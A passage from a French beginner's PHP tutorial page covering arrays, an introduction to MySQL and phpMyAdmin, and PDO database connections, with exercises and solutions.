                                    echo "<h4>Sports pratiqu√©s :</h4>";
                                    echo "<ul>";

                                    foreach ($sports as $sport) {
                                        echo "<li>$sport</li>";
                                    }

                                    echo "</ul>";
                                ?>
                            </code>
                        </pre>

                        <h4>Avec un tableau associatif :</h4>
                        <pre>
                            <code>
                                <?php
                                    $notes = [
                                        "Math√©matiques" => 16,
                                        "Fran√ßais" => 14,
                                        "Histoire" => 15,
                                        "Anglais" => 17
                                    ];

                                    echo "<h4>Bulletin de notes :</h4>";

                                    foreach ($notes as $matiere => $note) {
                                        echo "<p>$matiere : $note/20</p>";
                                    }
                                ?>
                            </code>
                        </pre>

                        <h3>9.4 Tableaux multidimensionnels</h3>
                        
                        <div class="concept-title">üì¶üì¶ Des bo√Ætes dans des bo√Ætes</div>
                        <p>Un tableau peut contenir... d'autres tableaux ! C'est comme des bo√Ætes dans des bo√Ætes.</p>

                        <h4>Exemple : Plusieurs personnes</h4>
                        <pre>
                            <code>
                                <?php
                                    $classe = [
                                        [
                                            "nom" => "Dupont",
                                            "prenom" => "Marie",
                                            "note" => 16
                                        ],
                                        [
                                            "nom" => "Martin", 
                                            "prenom" => "Pierre",
                                            "note" => 14
                                        ],
                                        [
                                            "nom" => "Bernard",
                                            "prenom" => "Julie", 
                                            "note" => 18
                                        ]
                                    ];

                                    echo "<h4>Liste de la classe :</h4>";

                                    foreach ($classe as $eleve) {
                                        echo "<p>";
                                        echo $eleve["prenom"] . " " . $eleve["nom"];
                                        echo " - Note : " . $eleve["note"] . "/20";
                                        echo "</p>";
                                    }
                                ?>
                            </code>
                        </pre>

                        <h3>9.5 Fonctions utiles pour les tableaux</h3>
                        
                        <div class="concept-title">üõ†Ô∏è Les outils pratiques</div>

                        <h4>Informations sur le tableau :</h4>
                        <pre>
                            <code>
                                <?php
                                    $animaux = ["chat", "chien", "oiseau", "poisson"];

                                    echo "Nombre d'animaux : " . count($animaux) . "<br>";
                                    echo "Le tableau est-il vide ? " . (empty($animaux) ? "Oui" : "Non") . "<br>";
                                    echo "Y a-t-il un chat ? " . (in_array("chat", $animaux) ? "Oui" : "Non") . "<br>";
                                ?>
                            </code>
                        </pre>

                        <h4>Ajouter et supprimer :</h4>
                        <pre>
                            <code>
                                    <?php
                                    $pile = ["premier", "deuxi√®me"];

                                    // Ajouter √† la fin
                                    array_push($pile, "troisi√®me");

                                    // Ajouter au d√©but  
                                    array_unshift($pile, "nouveau premier");

                                    // Supprimer le dernier
                                    $dernier = array_pop($pile);

                                    // Supprimer le premier
                                    $premier = array_shift($pile);

                                    print_r($pile);
                                ?>
                            </code>
                        </pre>

                        <h4>Trier :</h4>
                        <pre>
                            <code>
                                <?php
                                    $nombres = [5, 2, 8, 1, 9];

                                    // Tri croissant
                                    sort($nombres);
                                    echo "Croissant : " . implode(", ", $nombres) . "<br>";

                                    // Tri d√©croissant
                                    rsort($nombres);
                                    echo "D√©croissant : " . implode(", ", $nombres) . "<br>";
                                ?>
                            </code>
                        </pre>

                        <h3>9.6 Exercice pratique : Gestionnaire de biblioth√®que</h3>
                        
                        <p><strong>Objectif :</strong> Cr√©er un syst√®me simple pour g√©rer des livres.</p>
                        
                        <p><strong>Cr√©ez :</strong></p>
                        <ol>
                            <li>Un tableau pour stocker plusieurs livres avec :
                                <ul>
                                    <li>titre</li>
                                    <li>auteur</li>
                                    <li>ann√©e</li>
                                    <li>genre</li>
                                    <li>disponible (vrai/faux)</li>
                                </ul>
                            </li>
                            <li>Une fonction <code>afficherLivre($livre)</code> qui affiche joliment un livre</li>
                            <li>Une fonction <code>chercherParGenre($livres, $genre)</code> qui trouve tous les livres d'un genre</li>
                            <li>Une fonction <code>livresDisponibles($livres)</code> qui compte les livres disponibles</li>
                        </ol>

                        <p><strong>Donn√©es de test :</strong></p>
                        <pre>
                            <code>
                                $bibliotheque = [
                                    [
                                        "titre" => "Le Petit Prince",
                                        "auteur" => "Antoine de Saint-Exup√©ry", 
                                        "annee" => 1943,
                                        "genre" => "Fiction",
                                        "disponible" => true
                                    ],
                                    [
                                        "titre" => "1984",
                                        "auteur" => "George Orwell",
                                        "annee" => 1949, 
                                        "genre" => "Science-fiction",
                                        "disponible" => false
                                    ]
                                    // Ajoutez d'autres livres...
                                ];
                            </code>
                        </pre>
                        <details>
                            <summary><strong>üí° Voir la solution</strong></summary>
                            <pre>
                                <code>
                                    <?php
                                        function afficherLivre($livre) {
                                            echo "<div style='border: 1px solid #ccc; padding: 10px; margin: 10px 0;'>";
                                            echo "<h4>" . $livre["titre"] . "</h4>";
                                            echo "<p><strong>Auteur :</strong> " . $livre["auteur"] . "</p>";
                                            echo "<p><strong>Ann√©e :</strong> " . $livre["annee"] . "</p>";
                                            echo "<p><strong>Genre :</strong> " . $livre["genre"] . "</p>";
                                            echo "<p><strong>Statut :</strong> " . ($livre["disponible"] ? "Disponible" : "Emprunt√©") . "</p>";
                                            echo "</div>";
                                        }

                                        function chercherParGenre($livres, $genre) {
                                            $resultats = [];
                                            foreach ($livres as $livre) {
                                                if ($livre["genre"] == $genre) {
                                                    $resultats[] = $livre;
                                                }
                                            }
                                            return $resultats;
                                        }

                                        function livresDisponibles($livres) {
                                            $compteur = 0;
                                            foreach ($livres as $livre) {
                                                if ($livre["disponible"]) {
                                                    $compteur++;
                                                }
                                            }
                                            return $compteur;
                                        }

                                        // Donn√©es de test
                                        $bibliotheque = [
                                            [
                                                "titre" => "Le Petit Prince",
                                                "auteur" => "Antoine de Saint-Exup√©ry", 
                                                "annee" => 1943,
                                                "genre" => "Fiction",
                                                "disponible" => true
                                            ],
                                            [
                                                "titre" => "1984",
                                                "auteur" => "George Orwell",
                                                "annee" => 1949, 
                                                "genre" => "Science-fiction",
                                                "disponible" => false
                                            ],
                                            [
                                                "titre" => "Dune",
                                                "auteur" => "Frank Herbert",
                                                "annee" => 1965,
                                                            "genre" => "Science-fiction", 
                                            "disponible" => true
                                        ]
                                        ];

                                        // Test des fonctions
                                        echo "<h3>Tous les livres :</h3>";
                                        foreach ($bibliotheque as $livre) {
                                            afficherLivre($livre);
                                        }

                                        echo "<h3>Livres de science-fiction :</h3>";
                                        $sciFi = chercherParGenre($bibliotheque, "Science-fiction");
                                        foreach ($sciFi as $livre) {
                                            afficherLivre($livre);
                                        }

                                        echo "<h3>Statistiques :</h3>";
                                        echo "<p>Livres disponibles : " . livresDisponibles($bibliotheque) . "/" . count($bibliotheque) . "</p>";
                                    ?>
                                </code>
                            </pre>
                        </details>
                    </section>
                    <div class="explanation-box" style="margin-top: 40px;">
                        <h3>üéâ F√©licitations !</h3>
                        <p>Vous avez maintenant d√©couvert trois concepts fondamentaux de PHP :</p>
                        <ul>
                            <li><strong>Les boucles</strong> pour r√©p√©ter des actions automatiquement</li>
                            <li><strong>Les fonctions</strong> pour organiser et r√©utiliser votre code</li>
                            <li><strong>Les tableaux</strong> pour stocker et manipuler des collections de donn√©es</li>
                        </ul>
                        <p>Ces outils sont la base de la programmation PHP. Avec eux, vous pouvez d√©j√† cr√©er des applications simples mais puissantes !</p>
                        
                        <p><strong>Prochaines √©tapes sugg√©r√©es :</strong></p>
                        <ul>
                            <li>Pratiquez avec vos propres exercices</li>
                            <li>Combinez ces concepts dans des projets plus complexes</li>
                            <li>Explorez la programmation orient√©e objet (POO)</li>
                            <li>Apprenez √† interagir avec des bases de donn√©es</li>
                        </ul>
                    </div>
                </section>
                <!-- Partie 10: Introduction √† MySQL et phpMyAdmin -->
<section class="part10">
    <h2>10. Introduction √† MySQL et √† phpMyAdmin</h2>
    
    <p>Jusqu'√† pr√©sent, nos donn√©es disparaissaient d√®s que notre script se terminait. Imaginez un site e-commerce o√π tous les produits et commandes s'effacent √† chaque visite ! C'est l√† qu'interviennent les <strong>bases de donn√©es</strong> : des "coffres-forts num√©riques" qui conservent nos informations de fa√ßon permanente.</p>

    <h3>10.1 Qu'est-ce qu'une base de donn√©es ?</h3>
    
    <p>Une <strong>base de donn√©es</strong> est comme une biblioth√®que g√©ante et super organis√©e. Au lieu de livres, elle stocke des <strong>donn√©es</strong> (informations) dans des <strong>tables</strong> bien structur√©es.</p>

    <h4>Analogie avec une biblioth√®que :</h4>
    <ul>
        <li><strong>Base de donn√©es</strong> = La biblioth√®que enti√®re</li>
        <li><strong>Tables</strong> = Les √©tag√®res th√©matiques (romans, sciences, histoire...)</li>
        <li><strong>Colonnes</strong> = Les crit√®res d'organisation (titre, auteur, ann√©e...)</li>
        <li><strong>Lignes</strong> = Chaque livre individuel</li>
    </ul>

    <h4>Exemple concret : Table "utilisateurs"</h4>
    <div style="background: #f0f0f0; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <table border="1" style="border-collapse: collapse; width: 100%;">
            <tr style="background: #3498db; color: white;">
                <th>id</th><th>nom</th><th>email</th><th>age</th><th>ville</th>
            </tr>
            <tr>
                <td>1</td><td>Dupont</td><td>dupont@email.com</td><td>25</td><td>Paris</td>
            </tr>
            <tr>
                <td>2</td><td>Martin</td><td>martin@email.com</td><td>30</td><td>Lyon</td>
            </tr>
            <tr>
                <td>3</td><td>Bernard</td><td>bernard@email.com</td><td>28</td><td>Marseille</td>
            </tr>
        </table>
    </div>

    <p><strong>Vocabulaire important :</strong></p>
    <ul>
        <li><strong>Ligne (enregistrement)</strong> : Un utilisateur complet</li>
        <li><strong>Colonne (champ)</strong> : Une caract√©ristique (nom, email...)</li>
        <li><strong>Cl√© primaire</strong> : Un identifiant unique (ici "id")</li>
    </ul>

    <h3>10.2 Pourquoi MySQL ?</h3>
    
    <p><strong>MySQL</strong> est un <em>Syst√®me de Gestion de Base de Donn√©es</em> (SGBD). C'est comme le biblioth√©caire super efficace qui sait exactement o√π ranger et retrouver chaque information.</p>

    <h4>Avantages de MySQL :</h4>
    <ul>
        <li>üÜì <strong>Gratuit</strong> et open source</li>
        <li>‚ö° <strong>Rapide</strong> m√™me avec beaucoup de donn√©es</li>
        <li>üîí <strong>S√©curis√©</strong> avec gestion des droits d'acc√®s</li>
        <li>üåê <strong>Compatible</strong> avec PHP (duo parfait !)</li>
        <li>üìà <strong>√âvolutif</strong> : du petit site au gros e-commerce</li>
    </ul>

    <h4>Diff√©rence avec les fichiers :</h4>
    <div style="background: #f0f0f0; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <h5>‚ùå Stockage en fichiers :</h5>
        <pre><code>utilisateurs.txt :
Jean;jean@email.com;25;Paris
Marie;marie@email.com;30;Lyon</code></pre>
        <p><strong>Probl√®mes :</strong> Difficile √† modifier, pas de recherche rapide, pas de s√©curit√©</p>

        <h5>‚úÖ Stockage en base MySQL :</h5>
        <p><strong>Avantages :</strong> Recherche ultra-rapide, modifications faciles, s√©curit√©, sauvegarde automatique</p>
    </div>

    <h3>10.3 D√©couverte de phpMyAdmin</h3>
    
    <p><strong>phpMyAdmin</strong> est une interface web gratuite qui nous permet de g√©rer MySQL facilement, sans taper de commandes compliqu√©es. C'est comme avoir un panneau de contr√¥le visuel pour notre base de donn√©es.</p>

    <h4>Comment acc√©der √† phpMyAdmin :</h4>
    <ol>
        <li><strong>Avec XAMPP/WAMP/MAMP :</strong> D√©marrez Apache et MySQL, puis allez sur <code>http://localhost/phpmyadmin</code></li>
        <li><strong>Sur un h√©bergeur :</strong> Cherchez "phpMyAdmin" dans votre panneau d'administration</li>
        <li><strong>Localement :</strong> Souvent accessible via le menu de votre environnement de d√©veloppement</li>
    </ol>

    <h4>Interface de phpMyAdmin :</h4>
    <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <h5>üè† Page d'accueil :</h5>
        <ul>
            <li><strong>Colonne de gauche :</strong> Liste des bases de donn√©es</li>
            <li><strong>Centre :</strong> Informations et statistiques du serveur</li>
            <li><strong>Onglets du haut :</strong> Bases de donn√©es, SQL, Statut, etc.</li>
        </ul>

        <h5>üìä Dans une base de donn√©es :</h5>
        <ul>
            <li><strong>Structure :</strong> Voir l'organisation des tables</li>
            <li><strong>SQL :</strong> Ex√©cuter des requ√™tes personnalis√©es</li>
            <li><strong>Rechercher :</strong> Trouver des donn√©es sp√©cifiques</li>
            <li><strong>Exporter :</strong> Sauvegarder vos donn√©es</li>
        </ul>
    </div>

    <h3>10.4 Cr√©ation de votre premi√®re base de donn√©es</h3>
    
    <h4>√âtape 1 : Cr√©er la base</h4>
    <ol>
        <li>Ouvrez phpMyAdmin</li>
        <li>Cliquez sur <strong>"Nouvelle base de donn√©es"</strong></li>
        <li>Nom : <code>ecole_php</code></li>
        <li>Interclassement : <code>utf8_general_ci</code> (pour les accents fran√ßais)</li>
        <li>Cliquez <strong>"Cr√©er"</strong></li>
    </ol>

    <h4>√âtape 2 : Cr√©er votre premi√®re table</h4>
    <pre><code>-- Structure de la table "etudiants"
CREATE TABLE etudiants (
    id INT AUTO_INCREMENT PRIMARY KEY,
    nom VARCHAR(50) NOT NULL,
    prenom VARCHAR(50) NOT NULL,
    email VARCHAR(100) UNIQUE,
    age INT,
    ville VARCHAR(50),
    date_inscription DATE
);</code></pre>

    <p><strong>Explication du code :</strong></p>
    <ul>
        <li><code>id INT AUTO_INCREMENT PRIMARY KEY</code> : Num√©ro unique qui s'incr√©mente automatiquement</li>
        <li><code>VARCHAR(50)</code> : Texte de maximum 50 caract√®res</li>
        <li><code>NOT NULL</code> : Ce champ est obligatoire</li>
        <li><code>UNIQUE</code> : Chaque email doit √™tre diff√©rent</li>
        <li><code>DATE</code> : Format date (YYYY-MM-DD)</li>
    </ul>

    <h4>√âtape 3 : Ajouter des donn√©es de test</h4>
    <pre><code>-- Ins√©rer quelques √©tudiants
INSERT INTO etudiants (nom, prenom, email, age, ville, date_inscription) VALUES
('Dupont', 'Jean', 'jean.dupont@email.com', 22, 'Paris', '2024-01-15'),
('Martin', 'Marie', 'marie.martin@email.com', 24, 'Lyon', '2024-01-16'),
('Bernard', 'Pierre', 'pierre.bernard@email.com', 23, 'Marseille', '2024-01-17');</code></pre>

    <h3>10.5 Types de donn√©es essentiels</h3>
    
    <h4>Types num√©riques :</h4>
    <ul>
        <li><code>INT</code> : Nombres entiers (-2 milliards √† +2 milliards)</li>
        <li><code>DECIMAL(10,2)</code> : Nombres d√©cimaux (10 chiffres dont 2 apr√®s la virgule)</li>
        <li><code>FLOAT</code> : Nombres d√©cimaux approximatifs</li>
    </ul>

    <h4>Types texte :</h4>
    <ul>
        <li><code>VARCHAR(255)</code> : Texte court variable (jusqu'√† 255 caract√®res)</li>
        <li><code>TEXT</code> : Texte long (articles, descriptions...)</li>
        <li><code>CHAR(10)</code> : Texte de taille fixe (codes postaux, t√©l√©phones...)</li>
    </ul>

    <h4>Types date/heure :</h4>
    <ul>
        <li><code>DATE</code> : Date seule (2024-12-25)</li>
        <li><code>TIME</code> : Heure seule (14:30:00)</li>
        <li><code>DATETIME</code> : Date et heure (2024-12-25 14:30:00)</li>
        <li><code>TIMESTAMP</code> : Date/heure avec mise √† jour automatique</li>
    </ul>

    <h4>Types sp√©ciaux :</h4>
    <ul>
        <li><code>BOOLEAN</code> : Vrai/Faux (1/0)</li>
        <li><code>ENUM('petit', 'moyen', 'grand')</code> : Choix limit√©</li>
    </ul>

    <h3>10.6 Bonnes pratiques</h3>
    
    <h4>Nommage :</h4>
    <ul>
        <li><strong>Tables :</strong> Au pluriel et en minuscules (<code>utilisateurs</code>, <code>produits</code>)</li>
        <li><strong>Colonnes :</strong> En minuscules avec underscore (<code>date_creation</code>, <code>prix_unitaire</code>)</li>
        <li><strong>Pas d'accents</strong> ni d'espaces dans les noms</li>
    </ul>

    <h4>Structure :</h4>
    <ul>
        <li>Toujours une <strong>cl√© primaire</strong> (g√©n√©ralement <code>id</code>)</li>
        <li>D√©finir les contraintes (<code>NOT NULL</code>, <code>UNIQUE</code>)</li>
        <li>Choisir le bon type de donn√©es (pas de VARCHAR pour des nombres !)</li>
    </ul>

    <h3>10.7 Exercice pratique : Cr√©er une base "boutique"</h3>
    
    <p><strong>Objectif :</strong> Cr√©er une base de donn√©es pour une petite boutique en ligne.</p>
    
    <p><strong>Cr√©ez ces tables :</strong></p>
    
    <h4>1. Table "produits" :</h4>
    <ul>
        <li>id (cl√© primaire)</li>
        <li>nom (50 caract√®res, obligatoire)</li>
        <li>description (texte long)</li>
        <li>prix (d√©cimal avec 2 d√©cimales)</li>
        <li>stock (nombre entier)</li>
        <li>categorie (enum: 'electronique', 'vetement', 'livre', 'autre')</li>
        <li>date_ajout (date et heure automatique)</li>
    </ul>

    <h4>2. Table "commandes" :</h4>
    <ul>
        <li>id (cl√© primaire)</li>
        <li>numero_commande (10 caract√®res, unique)</li>
        <li>client_nom (50 caract√®res, obligatoire)</li>
        <li>client_email (100 caract√®res, obligatoire)</li>
        <li>total (d√©cimal)</li>
        <li>statut (enum: 'en_attente', 'expediee', 'livree')</li>
        <li>date_commande (date et heure automatique)</li>
    </ul>

    <p><strong>Ajoutez quelques donn√©es de test dans chaque table.</strong></p>

    <details>
        <summary><strong>üí° Voir la solution</strong></summary>
        <pre><code>-- Cr√©ation de la base de donn√©es
CREATE DATABASE boutique;
USE boutique;

-- Table produits
CREATE TABLE produits (
    id INT AUTO_INCREMENT PRIMARY KEY,
    nom VARCHAR(50) NOT NULL,
    description TEXT,
    prix DECIMAL(10,2) NOT NULL,
    stock INT DEFAULT 0,
    categorie ENUM('electronique', 'vetement', 'livre', 'autre') DEFAULT 'autre',
    date_ajout TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Table commandes
CREATE TABLE commandes (
    id INT AUTO_INCREMENT PRIMARY KEY,
    numero_commande VARCHAR(10) UNIQUE NOT NULL,
    client_nom VARCHAR(50) NOT NULL,
    client_email VARCHAR(100) NOT NULL,
    total DECIMAL(10,2) NOT NULL,
    statut ENUM('en_attente', 'expediee', 'livree') DEFAULT 'en_attente',
    date_commande TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Donn√©es de test pour produits
INSERT INTO produits (nom, description, prix, stock, categorie) VALUES
('Smartphone XY', 'T√©l√©phone derni√®re g√©n√©ration avec cam√©ra 48MP', 599.99, 15, 'electronique'),
('T-shirt bleu', 'T-shirt 100% coton, couleur bleu marine', 19.99, 50, 'vetement'),
('Guide PHP', 'Livre complet pour apprendre PHP et MySQL', 29.99, 25, 'livre'),
('Casque Bluetooth', 'Casque sans fil avec r√©duction de bruit', 79.99, 8, 'electronique');

-- Donn√©es de test pour commandes
INSERT INTO commandes (numero_commande, client_nom, client_email, total, statut) VALUES
('CMD001', 'Jean Dupont', 'jean@email.com', 619.98, 'expediee'),
('CMD002', 'Marie Martin', 'marie@email.com', 49.98, 'en_attente'),
('CMD003', 'Pierre Bernard', 'pierre@email.com', 29.99, 'livree');</code></pre>
    </details>
</section>

<!-- Partie 11: Connexion PHP √† MySQL -->
<section class="part11">
    <h2>11. Connexion PHP √† MySQL (PDO ou MySQLi)</h2>
    
    <p>Maintenant que nous avons une base de donn√©es, il faut que PHP puisse "parler" avec elle ! C'est comme si PHP √©tait un traducteur entre votre site web et la base de donn√©es MySQL. En PHP, nous avons deux moyens principaux pour cette connexion : <strong>PDO</strong> et <strong>MySQLi</strong>.</p>

    <h3>11.1 PDO vs MySQLi : Que choisir ?</h3>
    
    <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <h4>üèÜ PDO (PHP Data Objects) - Recommand√©</h4>
        <p><strong>Avantages :</strong></p>
        <ul>
            <li>‚úÖ Compatible avec plusieurs bases de donn√©es (MySQL, PostgreSQL, SQLite...)</li>
            <li>‚úÖ Syntaxe coh√©rente et moderne</li>
            <li>‚úÖ Meilleure s√©curit√© avec les requ√™tes pr√©par√©es</li>
            <li>‚úÖ Gestion d'erreurs plus claire</li>
        </ul>

        <h4>‚öñÔ∏è MySQLi (MySQL Improved)</h4>
        <p><strong>Avantages :</strong></p>
        <ul>
            <li>‚úÖ L√©g√®rement plus rapide pour MySQL</li>
            <li>‚úÖ Syntaxe proc√©durale et orient√©e objet</li>
            <li>‚ùå Fonctionne uniquement avec MySQL</li>
        </ul>
    </div>

    <p><strong>Notre choix :</strong> Nous utiliserons <strong>PDO</strong> car il est plus moderne, plus s√©curis√© et plus flexible !</p>

    <h3>11.2 Informations de connexion</h3>
    
    <p>Pour se connecter √† MySQL, PHP a besoin de 4 informations essentielles :</p>

    <div style="background: #f0f0f0; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <ul>
            <li><strong>H√¥te (host) :</strong> O√π se trouve le serveur MySQL</li>
            <li><strong>Nom de la base :</strong> Quelle base utiliser</li>
            <li><strong>Utilisateur :</strong> Le "login" pour acc√©der</li>
            <li><strong>Mot de passe :</strong> Le "password" pour s'identifier</li>
        </ul>
    </div>

    <h4>Valeurs typiques selon l'environnement :</h4>
    <pre><code>// ‚ö° D√©veloppement local (XAMPP/WAMP/MAMP)
$host = 'localhost';        // ou '127.0.0.1'
$dbname = 'ma_base';       // nom de votre base
$username = 'root';        // utilisateur par d√©faut
$password = '';            // souvent vide en local

// üåê Serveur de production
$host = 'mysql.monhebergeur.com';
$dbname = 'utilisateur_mabase';
$username = 'utilisateur_db';
$password = 'mot_de_passe_complexe';</code></pre>

    <h3>11.3 Premi√®re connexion avec PDO</h3>
    
    <h4>M√©thode simple :</h4>
    <pre><code><?php
// Informations de connexion
$host = 'localhost';
$dbname = 'ecole_php';  // La base cr√©√©e pr√©c√©demment
$username = 'root';
$password = '';

try {
    // Cr√©er la connexion PDO
    $pdo = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8", $username, $password);
    
    // Configurer PDO pour afficher les erreurs
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    echo "‚úÖ Connexion r√©ussie !";
    
} catch (PDOException $e) {
    echo "‚ùå Erreur de connexion : " . $e->getMessage();
}
?></code></pre>

    <p><strong>Explication du code :</strong></p>
    <ul>
        <li><code>new PDO()</code> : Cr√©e une nouvelle connexion</li>
        <li><code>"mysql:host=..."</code> : Cha√Æne de connexion (DSN)</li>
        <li><code>charset=utf8</code> : Pour les caract√®res fran√ßais</li>
        <li><code>try/catch</code> : Gestion des erreurs</li>
        <li><code>ATTR_ERRMODE</code> : Affiche les erreurs d√©taill√©es</li>
    </ul>

    <h3>11.4 Connexion s√©curis√©e avec fichier de configuration</h3>
    
    <p>Pour la s√©curit√©, il ne faut <strong>jamais</strong> mettre les mots de passe directement dans le code ! Cr√©ons un fichier de configuration s√©par√©.</p>

    <h4>Fichier config.php :</h4>
    <pre><code><?php
// config.php - Fichier de configuration
define('DB_HOST', 'localhost');
define('DB_NAME', 'ecole_php');
define('DB_USER', 'root');
define('DB_PASS', '');

// Fonction de connexion r√©utilisable
function connecterDB() {
    try {
        $dsn = "mysql:host=" . DB_HOST . ";dbname=" . DB_NAME . ";charset=utf8";
        $pdo = new PDO($dsn, DB_USER, DB_PASS);
        
        // Configuration PDO
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
        
        return $pdo;
        
    } catch (PDOException $e) {
        die("Erreur de connexion : " . $e->getMessage());
    }
}
?></code></pre>

    <h4>Utilisation dans vos scripts :</h4>
    <pre><code><?php
// Dans n'importe quel fichier PHP
require_once 'config.php';

// Se connecter √† la base
$pdo = connecterDB();

echo "‚úÖ Connexion √©tablie !";
?></code></pre>

    <div style="background: #fff3cd; border: 1px solid #ffc107; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <strong>üîí Conseil s√©curit√© :</strong> Ajoutez <code>config.php</code> dans votre fichier <code>.gitignore</code> pour √©viter de publier vos mots de passe sur GitHub !
    </div>

    <h3>11.5 Tester la connexion avec une requ√™te simple</h3>
    
    <pre><code><?php
require_once 'config.php';

try {
    $pdo = connecterDB();
    
    // Test simple : compter les √©tudiants
    $sql = "SELECT COUNT(*) as nombre_etudiants FROM etudiants";
    $resultat = $pdo->query($sql);
    $ligne = $resultat->fetch();
    
    echo "üìä Nombre d'√©tudiants dans la base : " . $ligne['nombre_etudiants'];
    
    // Test : r√©cup√©rer les infos de la base
    $sql = "SELECT DATABASE() as nom_base, VERSION() as version_mysql";
    $resultat = $pdo->query($sql);
    $info = $resultat->fetch();
    
    echo "<br>üóÑÔ∏è Base actuelle : " . $info['nom_base'];
    echo "<br>üîß Version MySQL : " . $info['version_mysql'];
    
} catch (PDOException $e) {
    echo "‚ùå Erreur : " . $e->getMessage();
}
?></code></pre>

    <h3>11.6 Gestion des erreurs et debug</h3>
    
    <h4>Configuration pour le d√©veloppement :</h4>
    <pre><code><?php
// Mode d√©veloppement - Affiche toutes les erreurs
function connecterDB_Dev() {
    try {
        $dsn = "mysql:host=" . DB_HOST . ";dbname=" . DB_NAME . ";charset=utf8";
        $pdo = new PDO($dsn, DB_USER, DB_PASS);
        
        // Configuration pour le debug
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
        $pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
        
        echo "üîß Mode d√©veloppement - Connexion OK<br>";
        return $pdo;
        
    } catch (PDOException $e) {
        echo "<div style='background:#ffebee;padding:10px;border-radius:5px;'>";
        echo "<strong>‚ùå Erreur de connexion :</strong><br>";
        echo "Code : " . $e->getCode() . "<br>";
        echo "Message : " . $e->getMessage() . "<br>";
        echo "Fichier : " . $e->getFile() . " ligne " . $e->getLine();
        echo "</div>";
        die();
    }
}
?></code></pre>

    <h4>Configuration pour la production :</h4>
    <pre><code><?php
// Mode production - Erreurs discr√®tes
function connecterDB_Prod() {
    try {
        $dsn = "mysql:host=" . DB_HOST . ";dbname=" . DB_NAME . ";charset=utf8";
        $pdo = new PDO($dsn, DB_USER, DB_PASS);
        
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
        
        return $pdo;
        
    } catch (PDOException $e) {
        // Log l'erreur dans un fichier
        error_log("Erreur DB : " . $e->getMessage(), 3, "logs/erreurs.log");
        
        // Message g√©n√©rique pour l'utilisateur
        die("Service temporairement indisponible. Merci de r√©essayer plus tard.");
    }
}
?></code></pre>

    <h3>11.7 Exercice pratique : Classe de connexion</h3>
    
    <p><strong>Objectif :</strong> Cr√©er une classe r√©utilisable pour g√©rer la connexion √† la base de donn√©es.</p>
    
    <p><strong>Cr√©ez une classe <code>Database</code> avec :</strong></p>
    <ol>
        <li>Propri√©t√©s priv√©es pour les informations de connexion</li>
        <li>M√©thode <code>connect()</code> qui retourne une connexion PDO</li>
        <li>M√©thode <code>testConnection()</code> qui v√©rifie si la connexion fonctionne</li>
        <li>Gestion des erreurs appropri√©e</li>
    </ol>

    <p><strong>Utilisation souhait√©e :</strong></p>
    <pre><code>$db = new Database('localhost', 'ecole_php', 'root', '');
$pdo = $db->connect();
$db->testConnection();</code></pre>

    <details>
        <summary><strong>üí° Voir la solution</strong></summary>
        <pre><code><?php
class Database {
    private $host;
    private $dbname;
    private $username;
    private $password;
    private $pdo;
    
    public function __construct($host, $dbname, $username, $password) {
        $this->host = $host;
        $this->dbname = $dbname;
        $this->username = $username;
        $this->password = $password;
    }
    
    public function connect() {
        if ($this->pdo === null) {
            try {
                $dsn = "mysql:host={$this->host};dbname={$this->dbname};charset=utf8";
                $this->pdo = new PDO($dsn, $this->username, $this->password);
                
                // Configuration PDO
                $this->pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                $this->pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
                
            } catch (PDOException $e) {
                throw new Exception("Erreur de connexion : " . $e->getMessage());
            }
        }
        
        return $this->pdo;
    }
    
    public function testConnection() {
        try {
            $pdo = $this->connect();
            $sql = "SELECT 1";
            $pdo->query($sql);
            echo "‚úÖ Connexion √† la base de donn√©es r√©ussie !<br>";
            
            // Infos suppl√©mentaires
            $sql = "SELECT DATABASE() as db, VERSION() as version";
            $result = $pdo->query($sql)->fetch();
            echo "üìã Base : {$result['db']}<br>";
            echo "üîß MySQL version : {$result['version']}<br>";
            
            return true;
            
        } catch (Exception $e) {
            echo "‚ùå Erreur de connexion : " . $e->getMessage() . "<br>";
            return false;
        }
    }
    
    public function closeConnection() {
        $this->pdo = null;
        echo "üîå Connexion ferm√©e.<br>";
    }
}

// Utilisation
try {
    $db = new Database('localhost', 'ecole_php', 'root', '');
    $pdo = $db->connect();
    $db->testConnection();
    
    // Votre code avec la base...
    
    $db->closeConnection();
    
} catch (Exception $e) {
    echo "Erreur : " . $e->getMessage();
}
?></code></pre>
    </details>
</section>

<!-- Partie 12: Requ√™tes SQL -->
<section class="part12">
    <h2>12. Requ√™tes SQL : SELECT, INSERT, UPDATE, DELETE</h2>
    
    <p>Maintenant que PHP peut parler avec MySQL, apprenons le <strong>langage SQL</strong> ! SQL (Structured Query Language) est le langage universel pour communiquer avec les bases de donn√©es. C'est comme apprendre √† dire "s'il vous pla√Æt" et "merci" √† votre base de donn√©es !</p>

    <p>Les 4 op√©rations essentielles sont :</p>
    <ul>
        <li><strong>SELECT</strong> : Lire/r√©cup√©rer des donn√©es üìñ</li>
        <li><strong>INSERT</strong> : Ajouter de nouvelles donn√©es ‚ûï</li>
        <li><strong>UPDATE</strong> : Modifier des donn√©es existantes ‚úèÔ∏è</li>
        <li><strong>DELETE</strong> : Supprimer des donn√©es üóëÔ∏è</li>
    </ul>

    <h3>12.1 SELECT - Lire les donn√©es</h3>
    
